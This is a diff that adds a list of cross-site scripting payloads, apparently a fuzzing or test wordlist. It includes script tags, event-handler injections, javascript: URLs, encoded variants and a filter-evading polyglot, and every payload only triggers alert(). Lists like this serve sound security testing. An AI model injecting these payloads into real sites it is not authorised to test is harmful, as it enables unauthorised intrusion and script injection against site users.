@@ -1,0 +1,17 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+'"><script>alert("XSS")</script>
+<img src="x" onerror="alert('XSS')">
+<input type="text" value="XSS" onfocus="alert('XSS')" autofocus>
+javascript:alert('XSS')
+<STYLE>@import'javascript:alert("XSS")';</STYLE>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<a href="javascript:alert('XSS')">Click me</a>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;input onfocus=alert('XSS') autofocus&gt;
+&lt;META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert("XSS");'&gt;
+&lt;STYLE&gt;@import'javascript:alert("XSS")';&lt;/STYLE&gt;
+&lt;IFRAME SRC='javascript:alert("XSS");'&gt;&lt;/IFRAME&gt;
+javascript:</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript>&lt;<script/>/<frame */; onload=alert()//&lt</script>
